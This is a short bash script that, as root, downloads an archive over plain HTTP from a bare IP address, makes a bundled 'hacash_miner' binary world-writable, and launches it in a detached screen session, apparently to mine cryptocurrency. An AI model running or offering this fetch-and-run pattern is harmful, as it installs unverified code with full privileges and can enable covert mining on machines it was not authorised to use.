#!/bin/bash
sudo -i <<EOF
wget http://3.95.133.91:8000/hacash.tar.gz
tar -xvf hacash.tar.gz
cd hacash/
chmod 777 ./hacash_miner
screen -dmS hac
screen -x -S hac -p 0 -X stuff "./hacash_miner \n"
echo ok
EOF